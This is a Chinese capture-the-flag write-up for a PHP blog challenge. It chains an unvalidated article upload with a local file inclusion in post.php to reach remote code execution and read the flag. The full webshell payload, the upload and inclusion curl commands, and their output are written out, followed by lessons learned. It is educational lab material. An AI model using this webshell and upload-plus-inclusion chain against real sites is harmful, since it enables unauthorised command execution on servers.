## 题解

### 入口与指纹

`Apache/2.4.54` + `X-Powered-By: PHP/7.4.33`，PHP 博客 **Encoder64 Blog**。

首页有两个值得注意的点：

1. 副标题是一串 base64：

   ```text
   e0knbV9hX1NjcmlwdF9LaWRkaWV9   →   {I'm_a_Script_Kiddie}
   ```

2. 导航里除了 `index.php` / `about.php` / `contact.php`，还有
   **`/posts/upload-article.php`**（投稿上传），而文章详情是 `post.php?id=<slug>`。

### 关键观察

**1. 投稿上传没有任何校验，文件原样落在 `/posts/uploads/`。**

```bash
printf '<?php echo "PWN:"; echo shell_exec($_GET["c"]); ?>' > sh.php
curl -F 'name=x' -F 'email=a@b.c' \
     -F 'articleFile=@sh.php;filename=sh28.php;type=application/x-php' \
     http://$T/posts/upload-article.php
# "Thank you for submitting your article..."（没有返回路径，但文件确实存下了）
```

直接访问能确认落点：

```bash
curl http://$T/posts/uploads/sh28.php
# <?php echo "PWN:"; ... ?>    ← 返回源码，不执行
```

即 `/posts/uploads/` **不配置 PHP 处理**，所以直接请求只会拿到源码。

**2. `post.php?id=` 是文件包含，且过滤只针对 `../`。**

| id | 结果 |
| --- | --- |
| `ScriptKiddie` | 正常渲染文章 |
| `1` / `ScriptKiddie'` | `Post not found.` |
| `../index.php` / `../../../../etc/passwd` | `Directory traversal attempt detected!` |
| `%2e%2e/%2e%2e/etc/passwd` | `Post not found.` |
| `uploads/sh28` | **执行上传的 PHP** |

`id` 会被拼成 `posts/<id>.php` 之类再 include，所以只要 `id` 指向
`uploads/xxx`，就等于「include 一个我上传的文件」。

**3. 两个能力一拼就是 RCE。**

```bash
curl --get --data-urlencode 'id=uploads/sh28' --data-urlencode 'c=id' \
  http://$T/post.php
# PWN:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

上传提供"可控内容"，LFI 提供"执行"，两者组合绕过"上传目录不解析 PHP"的限制。

### 利用链

```bash
T=$(head -1 .target)

# 1. 上传 webshell（扩展名/类型都不校验）
printf '<?php echo "PWN:"; echo shell_exec($_GET["c"]); ?>' > sh.php
curl -sS -F 'name=x' -F 'email=a@b.c' \
  -F 'articleFile=@sh.php;filename=sh28.php;type=application/x-php' \
  "http://$T/posts/upload-article.php"

# 2. 通过 post.php 的 LFI 包含它（id 不带 ../，所以不触发过滤）
curl -sS --get --data-urlencode 'id=uploads/sh28' --data-urlencode 'c=id' \
  "http://$T/post.php"

# 3. 读 flag（根目录是 /FLAG.txt）
curl -sS --get --data-urlencode 'id=uploads/sh28' \
  --data-urlencode 'c=cat /FLAG.txt' "http://$T/post.php"
```

```text
PWN:flag{cc60f9f8-07d5-4763-9e30-685e4e55c14a}
```

### flag 位置

容器根目录 `/FLAG.txt`（大写），经 webshell 读取。

## 复盘

- **"上传成功但不执行"不是死路，而是缺一个 include。** 上传目录不解析 PHP 很常见；
  真正决定能否 RCE 的是**有没有别的入口把这个文件 include 进来**。
  本题 `post.php?id=` 正好是文件包含。
- **LFI 的过滤只挡 `../`，但不需要 `../`。** 上传目录 `posts/uploads/` 与
  `post.php` 拼路径的基准目录是同一个 `posts/`，所以 `id=uploads/sh28`
  既达成目标又不触发过滤。**先算出"目标相对基准目录的路径"，比硬绕过滤便宜。**
- **上传表单不返回路径时要自己验证落点。** 响应只说"谢谢投稿"，没给 URL；
  我是按 `posts/uploads/<filename>` 猜中并 200 确认的。判据是"直接 GET 到源码"。
- **首页那串 base64 是干扰项。** `{I'm_a_Script_Kiddie}` 只是文章主题的彩蛋，
  既不是文件名也不是口令；试了 `post.php?id=<base64>`、`id={I'm_a_Script_Kiddie}`
  都是 `Post not found`。**看到 base64 先解码看语义，再决定值不值得追。**
- **flag 又是大写 `/FLAG.txt`。** 拿 shell 后先 `ls /` 已经是固定动作了。
